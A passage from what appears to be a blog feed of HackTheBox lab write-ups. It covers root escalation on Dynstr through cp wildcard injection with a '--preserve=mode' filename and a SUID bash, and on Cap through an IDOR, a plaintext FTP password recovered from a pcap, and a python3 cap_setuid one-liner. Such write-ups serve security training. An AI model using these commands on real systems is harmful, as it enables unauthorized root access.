drwxr-xr-x <span class="m">2</span> bindmgr bindmgr <span class="m">4096</span> Mar <span class="m">13</span> 14:53 support-case-C62796521
-r-------- <span class="m">1</span> bindmgr bindmgr   <span class="m">33</span> Jun <span class="m">17</span> 10:51 user.txt
bindmgr@dynstr:~$ cat user.txt
6404e...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>Checking for sudo permissions reveals that <code>bindmgr</code> is allowed to run a script called <code>bindmgr.sh</code> as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ sudo -l
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
Matching Defaults entries <span class="k">for</span> bindmgr on dynstr:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User bindmgr may run the following commands on dynstr:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
</code></pre></div><p>The author gives a well documented about what this script does.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/usr/bin/bash
</span><span class="cp"></span>
<span class="c1"># This script generates named.conf.bindmgr to workaround the problem</span>
<span class="c1"># that bind/named can only include single files but no directories.</span>
<span class="c1">#</span>
<span class="c1"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
<span class="c1"># from named.conf.local (or others) and will include all files from the</span>
<span class="c1"># directory /etc/bin/named.bindmgr.</span>
<span class="c1">#</span>
<span class="c1"># NOTE: The script is work in progress. For now bind is not including</span>
<span class="c1">#       named.conf.bindmgr.</span>
<span class="c1">#</span>
<span class="c1"># TODO: Currently the script is only adding files to the directory but</span>
<span class="c1">#       not deleting them. As we generate the list of files to be included</span>
<span class="c1">#       from the source directory they won&#39;t be included anyway.</span>

<span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
<span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr

indent<span class="o">()</span> <span class="o">{</span> sed <span class="s1">&#39;s/^/    /&#39;</span><span class="p">;</span> <span class="o">}</span>

<span class="c1"># Check versioning (.version)</span>
<span class="nb">echo</span> <span class="s2">&#34;[+] Running </span><span class="nv">$0</span><span class="s2"> to stage new configuration from </span><span class="nv">$PWD</span><span class="s2">.&#34;</span>
<span class="k">if</span> <span class="o">[[</span> ! -f .version <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
    <span class="nb">exit</span> <span class="m">42</span>
<span class="k">fi</span>
<span class="k">if</span> <span class="o">[[</span> <span class="s2">&#34;`cat .version 2&gt;/dev/null`&#34;</span> -le <span class="s2">&#34;`cat </span><span class="nv">$BINDMGR_DIR</span><span class="s2">/.version 2&gt;/dev/null`&#34;</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: Check versioning. Exiting.&#34;</span>
    <span class="nb">exit</span> <span class="m">43</span>
<span class="k">fi</span>

<span class="c1"># Create config file that includes all files from named.bindmgr.</span>
<span class="nb">echo</span> <span class="s2">&#34;[+] Creating </span><span class="nv">$BINDMGR_CONF</span><span class="s2"> file.&#34;</span>
<span class="nb">printf</span> <span class="s1">&#39;// Automatically generated file. Do not modify manually.\n&#39;</span> &gt; <span class="nv">$BINDMGR_CONF</span>
<span class="k">for</span> file in * <span class="p">;</span> <span class="k">do</span>
    <span class="nb">printf</span> <span class="s1">&#39;include &#34;/etc/bind/named.bindmgr/%s&#34;;\n&#39;</span> <span class="s2">&#34;</span><span class="nv">$file</span><span class="s2">&#34;</span> &gt;&gt; <span class="nv">$BINDMGR_CONF</span>
<span class="k">done</span>

<span class="c1"># Stage new version of configuration files.</span>
<span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
cp .version * /etc/bind/named.bindmgr/

<span class="c1"># Check generated configuration with named-checkconf.</span>
<span class="nb">echo</span> <span class="s2">&#34;[+] Checking staged configuration.&#34;</span>
named-checkconf <span class="nv">$BINDMGR_CONF</span> &gt;/dev/null
<span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
    <span class="nb">echo</span> <span class="s2">&#34;[-] ERROR: The generated configuration is not valid. Please fix following errors: &#34;</span>
    named-checkconf <span class="nv">$BINDMGR_CONF</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> indent
    <span class="nb">exit</span> <span class="m">44</span>
<span class="k">else</span>
    <span class="nb">echo</span> <span class="s2">&#34;[+] Configuration successfully staged.&#34;</span>
    <span class="c1"># *** TODO *** Uncomment restart once we are live.</span>
    <span class="c1"># systemctl restart bind9</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="nv">$?</span> -ne <span class="m">0</span> <span class="o">]]</span> <span class="p">;</span> <span class="k">then</span>
        <span class="nb">echo</span> <span class="s2">&#34;[-] Restart of bind9 via systemctl failed. Please check logfile: &#34;</span>
        systemctl status bind9
    <span class="k">else</span>
        <span class="nb">echo</span> <span class="s2">&#34;[+] Restart of bind9 via systemctl succeeded.&#34;</span>
    <span class="k">fi</span>
<span class="k">fi</span>
</code></pre></div><p>The first two <code>if</code> statement show that the script want a file called <code>.version</code>, and since it looks for the script from <code>$PWD</code>, I can create one in anywhere.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
</code></pre></div><p>Then when I run the script, it throws the following error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:~$ sudo bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /home/bindmgr.
<span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
<span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.conf.bindmgr:2: open: /etc/bind/named.bindmgr/support-case-C62796521: file not found
</code></pre></div><p>And this one is interesting</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cp: -r not specified<span class="p">;</span> omitting directory <span class="s1">&#39;support-case-C62796521&#39;</span>
</code></pre></div><p>If I trace it, the error come from these lines.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># Stage new version of configuration files.</span>
<span class="nb">echo</span> <span class="s2">&#34;[+] Staging files to </span><span class="nv">$BINDMGR_DIR</span><span class="s2">.&#34;</span>
cp .version * /etc/bind/named.bindmgr/
</code></pre></div><p>According to <a href="https://gtfobins.github.io/gtfobins/cp/.">GTFOBins</a>, using <code>cp</code> with <code>*</code> can lead to wildcard injection.</p>
<h4 id="exploitation">Exploitation</h4>
<p>To exploit <code>cp</code> with <code>*</code> (wildcard), I will create a copy of the bash binary and set SUID permissions on it, and then I will create another file with a filename  <code>--preserve=mode</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ <span class="nb">echo</span> <span class="s1">&#39;5&#39;</span> &gt; .version
bindmgr@dynstr:/dev/shm$ touch  <span class="s1">&#39;--preserve=mode&#39;</span>
bindmgr@dynstr:/dev/shm$ cp /bin/bash .
bindmgr@dynstr:/dev/shm$ chmod u+s bash
bindmgr@dynstr:/dev/shm$ ls -la
total <span class="m">1164</span>
drwxrwxrwt  <span class="m">2</span> root    root        <span class="m">100</span> Jun <span class="m">17</span> 15:18  .
drwxr-xr-x <span class="m">17</span> root    root       <span class="m">3940</span> Jun <span class="m">17</span> 10:51  ..
-rwsr-sr-x  <span class="m">1</span> bindmgr bindmgr <span class="m">1183448</span> Jun <span class="m">17</span> 15:18  bash
-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">1</span> Jun <span class="m">17</span> 15:12 <span class="s1">&#39;--preserve=mode&#39;</span>
-rw-rw-r--  <span class="m">1</span> bindmgr bindmgr       <span class="m">2</span> Jun <span class="m">17</span> 14:47  .version
</code></pre></div><p><code>cp</code> will see that <code>--preserve=mode</code> file as name as a flag/option/switch, so it becomes</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cp .version --preserve<span class="o">=</span>mode /etc/bind/named.bindmgr/
</code></pre></div><p>When I run <code>bindmgr.sh</code> again, it throws another error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ sudo bindmgr.sh
sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
<span class="o">[</span>+<span class="o">]</span> Running /usr/local/bin/bindmgr.sh to stage new configuration from /dev/shm.
<span class="o">[</span>+<span class="o">]</span> Creating /etc/bind/named.conf.bindmgr file.
<span class="o">[</span>+<span class="o">]</span> Staging files to /etc/bind/named.bindmgr.
<span class="o">[</span>+<span class="o">]</span> Checking staged configuration.
<span class="o">[</span>-<span class="o">]</span> ERROR: The generated configuration is not valid. Please fix following errors:
    /etc/bind/named.bindmgr/bash:1: unknown option <span class="s1">&#39;ELF☻☺☺...&#39;</span>
    /etc/bind/named.bindmgr/bash:14: unknown option <span class="s1">&#39;♥h□ȀE□♣&#39;</span>
    /etc/bind/named.bindmgr/bash:40: unknown option <span class="s1">&#39;□YF&#39;</span>
    /etc/bind/named.bindmgr/bash:40: unexpected token near <span class="s1">&#39;}&#39;</span>
</code></pre></div><p>But now under <code>/etc/bind/named.bindmgr</code>, I have a copy of bash with SUID permissions set to root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ ls -la /etc/bind/named.bindmgr
total <span class="m">1168</span>
drwxr-sr-x <span class="m">2</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 .
drwxr-sr-x <span class="m">3</span> root <span class="nb">bind</span>    <span class="m">4096</span> Jun <span class="m">17</span> 15:18 ..
-rwsr-sr-x <span class="m">1</span> root <span class="nb">bind</span> <span class="m">1183448</span> Jun <span class="m">17</span> 15:18 bash
-rw-rw-r-- <span class="m">1</span> root <span class="nb">bind</span>       <span class="m">2</span> Jun <span class="m">17</span> 15:18 .version
</code></pre></div><p>Executing that bash with <code>-p</code> gives me a root shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bindmgr@dynstr:/dev/shm$ /etc/bind/named.bindmgr/bash -p
bash-5.0# id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bindmgr<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>117<span class="o">(</span><span class="nb">bind</span><span class="o">)</span>,1001<span class="o">(</span>bindmgr<span class="o">)</span>
bash-5.0# whoami
root
</code></pre></div><p>The flag</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">bash-5.0# ls -l
total <span class="m">8</span>
drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">14</span> 14:18 cleanup
-r-------- <span class="m">1</span> root root   <span class="m">33</span> Jun <span class="m">17</span> 10:51 root.txt
bash-5.0# cat root.txt
64348...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cap</title>
      <link>https://fahmifj.github.io/hackthebox/cap/</link>
      <pubDate>Thu, 14 Oct 2021 04:42:42 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/cap/</guid>
      <description>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a pcap file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the CAP_SETUID capability set, which can be exploited to gain root access.
Skills Learned  Identifying/Exploiting IDOR Exploiting CAP_SETUID on Python  Tools  nmap wireshark  Reconnaissance Nmap Running nmap scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</description>
      <content:encoded><![CDATA[<p>Cap starts by identifying an IDOR vulnerability on its hosted website. Using this IDOR, I can obtain a <code>pcap</code> file containing a set of FTP login credentials that can also be used for SSH login. Enumerating the system reveals that the installed Python binary has the <code>CAP_SETUID</code> capability set, which can be exploited to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Identifying/Exploiting IDOR</li>
<li>Exploiting CAP_SETUID on Python</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>nmap</li>
<li>wireshark</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Running <code>nmap</code> scan against this machine reveals 3 open ports: SSH on 22, FTP on 21, and HTTP on 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ nmap -p- --min-rate <span class="m">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.245        
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:07 EDT
Nmap scan report <span class="k">for</span> 10.10.10.245
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.070s latency<span class="o">)</span>.
Not shown: <span class="m">65532</span> closed ports
Reason: <span class="m">65532</span> resets
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl <span class="m">63</span>
22/tcp open  ssh     syn-ack ttl <span class="m">63</span>
80/tcp open  http    syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.33 seconds
→ root@kali «cap» «10.10.14.34» 
$ nmap -p21,22,80 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.245
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-09 05:08 EDT
Nmap scan report <span class="k">for</span> 10.10.10.245
Host is up <span class="o">(</span>0.062s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp open  http    gunicorn
<span class="p">|</span> fingerprint-strings: 
<span class="p">|</span>   FourOhFourRequest: 
<span class="p">|</span>     HTTP/1.0 <span class="m">404</span> NOT FOUND
<span class="p">|</span>     Server: gunicorn
<span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:25 GMT
<span class="p">|</span>     Connection: close
<span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="p">|</span>     Content-Length: <span class="m">232</span>
<span class="p">|</span>     &lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 3.2 Final//EN&#34;</span>&gt;
<span class="p">|</span>     &lt;title&gt;404 Not Found&lt;/title&gt;
<span class="p">|</span>     &lt;h1&gt;Not Found&lt;/h1&gt;
<span class="p">|</span>     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
<span class="p">|</span>   GetRequest: 
<span class="p">|</span>     HTTP/1.0 <span class="m">200</span> OK
<span class="p">|</span>     Server: gunicorn
<span class="p">|</span>     Date: Wed, <span class="m">09</span> Jun <span class="m">2021</span> 09:08:19 GMT
<span class="p">|</span>     Connection: close
<span class="p">|</span>     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
<span class="p">|</span>     Content-Length: <span class="m">19386</span>
<span class="p">|</span>     &lt;!DOCTYPE html&gt;
<span class="p">|</span>     &lt;html <span class="nv">class</span><span class="o">=</span><span class="s2">&#34;no-js&#34;</span> <span class="nv">lang</span><span class="o">=</span><span class="s2">&#34;en&#34;</span>&gt;
<span class="p">|</span>     &lt;head&gt;
<span class="p">|</span>     &lt;meta <span class="nv">charset</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span>&gt;
<span class="p">|</span>     &lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;x-ua-compatible&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;ie=edge&#34;</span>&gt;
<span class="p">|</span>     &lt;title&gt;Security Dashboard&lt;/title&gt;
<span class="p">|</span>     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;viewport&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;shortcut icon&#34;</span> <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;image/png&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/images/icon/favicon.ico&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/bootstrap.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/font-awesome.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/themify-icons.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/metisMenu.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/owl.carousel.min.css&#34;</span>&gt;
<span class="p">|</span>     &lt;link <span class="nv">rel</span><span class="o">=</span><span class="s2">&#34;stylesheet&#34;</span> <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/static/css/slicknav.min.css&#34;</span>&gt;

...<span class="o">[</span>SNIP<span class="o">]</span>...

<span class="p">|</span>_http-server-header: gunicorn
<span class="p">|</span>_http-title: Security Dashboard
<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/9%Time<span class="o">=</span>60C08501%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>GetRe
SF:quest,2FE5,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20W
</span><span class="s2">
</span><span class="s2">...[SNIP]...
</span><span class="s2">
</span><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 131.73 seconds
</span></code></pre></div><p>Since <code>nmap</code> didn&rsquo;t show anonymous login in FTP, I will head to the website.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>When I get to the website on port 80, I find that I&rsquo;ve already logged in as Nathan.</p>
<p><div class="img-container"><img src="imgs/image-20210609162151343.png" alt="image-20210609162151343"  /></div>
</p>
<p>There are some menu in the side navigation bar. One menu that I find interesting is the &ldquo;Security Snapshot&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210609162215061.png" alt="image-20210609162215061"  /></div>
</p>
<p>In the &ldquo;Security Snapshot&rdquo; page, there is a download button which gives me a <code>pcap</code> file. Based on the URL, it seems there are 8 pcap files that have been generated so far.</p>
<p><div class="img-container"><img src="imgs/image-20210609162434839.png" alt="image-20210609162434839"  /></div>
</p>
<p>When I open the <code>pcap</code> file, it was empty.</p>
<h4 id="idor">IDOR</h4>
<p>The download URL for pcap file is interesting here, and when I change it to 0, it pops another download prompt.</p>
<p><div class="img-container"><img src="imgs/image-20210609162545619.png" alt="image-20210609162545619"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nathan">Shell as nathan</h3>
<h4 id="pcap-analysis">Pcap Analysis</h4>
<p>There are quite a lot of traffic captured in this <code>0.pcap</code> file, but if I filter it to only show FTP, it shows that there is an FTP login performed by user <strong>nathan</strong>. Since there is no encryption, I can also see the login password.</p>
<p><div class="img-container"><img src="imgs/image-20210609162111265.png" alt="image-20210609162111265"  /></div>
</p>
<h4 id="ftp-access">FTP access</h4>
<p>Entering <code>nathan:Buck3tH4Tf0RM3</code> logs me in into the FTP server, and I can read the user flag from there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ ftp 10.10.10.245
Connected to 10.10.10.245.
<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:root<span class="o">)</span>: nathan
<span class="m">331</span> Please specify the password.
Password:
<span class="m">230</span> Login successful.
Remote system <span class="nb">type</span> is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
<span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
<span class="m">150</span> Here comes the directory listing.
-rw-rw-r--    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">8088</span> Jun <span class="m">09</span> 08:04 25134.c
-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>        <span class="m">18360</span> Jun <span class="m">09</span> 08:25 exp
-rwxrwxr-x    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>       <span class="m">342868</span> Jun <span class="m">09</span> 06:24 linpeas.sh
drwxr-xr-x    <span class="m">3</span> <span class="m">1001</span>     <span class="m">1001</span>         <span class="m">4096</span> Jun <span class="m">09</span> 06:26 snap
-r--------    <span class="m">1</span> <span class="m">1001</span>     <span class="m">1001</span>           <span class="m">33</span> Jun <span class="m">09</span> 04:59 user.txt
<span class="m">226</span> Directory send OK.
ftp&gt; 
</code></pre></div><h4 id="ssh---nathan">SSH - nathan</h4>
<p>The credentials can also be used for SSH login.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «cap» «10.10.14.34» 
$ ssh nathan@10.10.10.245
nathan@10.10.10.245<span class="err">&#39;</span>s password: 
Welcome to Ubuntu 20.04.2 LTS <span class="o">(</span>GNU/Linux 5.4.0-73-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jun  <span class="m">9</span> 09:35:15 UTC <span class="m">2021</span>

  System load:           0.0
  Usage of /:            35.0% of 8.73GB
  Memory usage:          34%
  Swap usage:            0%
  Processes:             <span class="m">229</span>
  Users logged in:       <span class="m">0</span>
  IPv4 address <span class="k">for</span> eth0: 10.10.10.245
  IPv6 address <span class="k">for</span> eth0: dead:beef::250:56ff:feb9:f2f1

  <span class="o">=</span>&gt; There are <span class="m">4</span> zombie processes.

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Wed Jun  <span class="m">9</span> 08:53:04 <span class="m">2021</span> from 10.10.16.15
nathan@cap:~$ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="web-source-code">Web source code</h4>
<p>With shell access, I went to the web directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ ls -l
total <span class="m">24</span>
drwxr-xr-x <span class="m">2</span> nathan nathan <span class="m">4096</span> May <span class="m">27</span> 09:10 __pycache__
-rw-r--r-- <span class="m">1</span> nathan nathan <span class="m">4293</span> Jun  <span class="m">9</span> 10:19 app.py
drwxr-xr-x <span class="m">6</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 static
drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> May <span class="m">23</span> 19:17 templates
drwxr-xr-x <span class="m">2</span> root   root   <span class="m">4096</span> Jun  <span class="m">9</span> 10:12 upload
nathan@cap:/var/www/html$ 
</code></pre></div><p>Looking at the source code, I see one interesting line code in a variable called <code>command</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python3</span>
<span class="o">...&lt;</span><span class="n">SNIP</span><span class="o">&gt;...</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s2">&#34;/capture&#34;</span><span class="p">)</span>
<span class="nd">@limiter</span><span class="o">.</span><span class="n">limit</span><span class="p">(</span><span class="s2">&#34;10 per minute&#34;</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>

        <span class="n">get_lock</span><span class="p">()</span>
        <span class="n">pcapid</span> <span class="o">=</span> <span class="n">get_appid</span><span class="p">()</span>
        <span class="n">increment_appid</span><span class="p">()</span>
        <span class="n">release_lock</span><span class="p">()</span>

        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">root_path</span><span class="p">,</span> <span class="s2">&#34;upload&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;.pcap&#34;</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">remote_addr</span>
        <span class="c1"># permissions issues with gunicorn and threads. hacky solution for now.</span>
        <span class="c1">#os.setuid(0)</span>
        <span class="c1">#command = f&#34;timeout 5 tcpdump -w {path} -i any host {ip}&#34;</span>
        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;python3 -c &#39;import os; os.setuid(0); os.system(&#34;timeout 5 tcpdump -w </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s2"> -i any host </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s2">&#34;)&#39;&#34;&#34;&#34;</span>
        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="c1">#os.setuid(1000)</span>
<span class="o">...</span><span class="p">[</span><span class="n">SNIP</span><span class="p">]</span><span class="o">...</span>
</code></pre></div><h4 id="linux-capabilities">Linux Capabilities</h4>
<p>When I examine the running process, the web server is currently running as <code>nathan</code>, so <code>os.setuid(0)</code> shouldn&rsquo;t be possible, except the binary has a <code>CAP SETUID</code> <a href="https://gtfobins.github.io/gtfobins/python/#capabilities">capability set</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210609174520024.png" alt="image-20210609174520024"  /></div>
</p>
<p>A quick check on the Python binary shows that it has the <code>cap_setuid</code> set.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3<span class="k">)</span>
lrwxrwxrwx <span class="m">1</span> root root <span class="m">9</span> Mar <span class="m">13</span>  <span class="m">2020</span> /usr/bin/python3 -&gt; python3.8
nathan@cap:/var/www/html$ ls -l <span class="k">$(</span>which python3.8<span class="k">)</span>
-rwxr-xr-x <span class="m">1</span> root root <span class="m">5486384</span> Jan <span class="m">27</span> 15:41 /usr/bin/python3.8
nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
</code></pre></div><p>So I can escalate myself to root with <code>python3 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)'</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">nathan@cap:/var/www/html$ python3 -c <span class="s1">&#39;import os; os.setuid(0); os.system(&#34;/bin/bash&#34;)&#39;</span>
root@cap:/var/www/html# id
